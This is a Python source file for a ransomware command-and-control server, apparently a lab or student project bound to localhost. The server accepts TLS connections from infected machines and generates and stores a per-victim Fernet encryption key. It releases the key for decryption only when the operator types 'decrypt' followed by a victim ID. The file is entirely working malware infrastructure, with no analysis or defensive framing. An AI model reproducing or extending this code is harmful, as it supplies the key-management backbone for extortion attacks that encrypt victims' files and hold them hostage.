"""
C&C server for communication with the ransomware on local machine
"""
import socket, select
import os
import sys
import ssl
from threading import Thread
from cryptography.fernet import Fernet

class ClientThread(Thread):
    """
    Client thread class, responsible for making connection to clients and sending them thier key
    """

    def __init__(self, host: str, port: int, conn: ssl.SSLSocket, tu) -> None:
        Thread.__init__(self)
        self.host = host
        self.port = port
        self.conn = conn
        self.id = None
        self.thread_update = tu

    def run(self) -> None:
        """
        Run function:
        recieves the connection and then runs Servers thread_check function to properly update our database
        """
        while True:
            
            data = self.conn.recv(2048)

            if self.id == None:
                self.id = data

            if not data: break
            
            print(f"recieved user connectinon: {data}")
            
            try:
                self.thread_update(self, data.decode("Utf-8"))
            except:
                continue

class Server():
    """
    Server Class, manages user files and connections
    """
    def __init__(self, host: str, port: int) -> None:
        
        """
        Mainly socket setup in the initialzer
        """
        self.context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        self.context.load_cert_chain("cnc/cert.pem", "cnc/key.pem")

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((host, port))
        self.sock.listen(10)
        self.secSock = self.context.wrap_socket(self.sock, server_side=True)
        self.host = host
        self.port = port
        self.threads = {}
        self.inp = ''
        

    def keyGen(self, id: str) -> bytes:
        """
        Generate key and save it to file named after client id
        """
        key = Fernet.generate_key()
        with open(os.path.join("Users", id), 'wb') as gotUser:
            gotUser.write(key)
        return key

    def thread_check(self, new_thread: ClientThread, userId: str) -> None:
        """
        check if new user exists in our database, other wise add them to it and send a key
        """
        print(userId)
        print("knowns users: ", self.threads.keys())

        if userId in self.threads:
            new_thread.conn.send(b"wait")
            self.threads[userId] = new_thread
            return
        
        new_thread.conn.send(self.keyGen(userId))
        self.threads[userId] = new_thread
    
    def start(self) -> None:
        """
        wait for connections
        """
        r_socks, w_socks, e_socks = select.select([self.secSock], [], [])
        while True:
            for sock in r_socks:
                (conn, (self.host, self.port)) = self.secSock.accept()
                new_thread = ClientThread(self.host, self.port, conn, self.thread_check)
                new_thread.start()
            
    def sig_dec(self, key: str, user: ClientThread) -> None:
        """
        Send user key for decyrption
        """
        user.conn.send(bytes(key, "Utf-8"))

    def inputThread(self) -> str:
        """
        input loop to manage decryption
        use - type: decrypt and the name of the user file
        """
        
        while 1:
            self.inp = input(">: ")
            print(self.inp)
            if self.inp == "kill":
                return
            
            cmd = self.inp.split(' ')
            if len(cmd) > 1:
                user = cmd[1]
                cmd = cmd[0]
            else:
                continue

            if cmd == "decrypt":
                with open(os.path.join('Users', user), 'r') as userfile:
                    key = userfile.readline()
                    print(key)                   
                    self.sig_dec(key, self.threads[user])

    def inputLoop(self) -> None:
        """
        Main code for the server,
        starts the input loop and runs the client connection loop
        """
        
        inputThread = Thread(target=self.inputThread)
        inputThread.start()

        self.start()

        inputThread.join()
        





if __name__ == "__main__":

    s = Server("127.0.0.1", 5789)
    s.inputLoop()

    sys.exit()
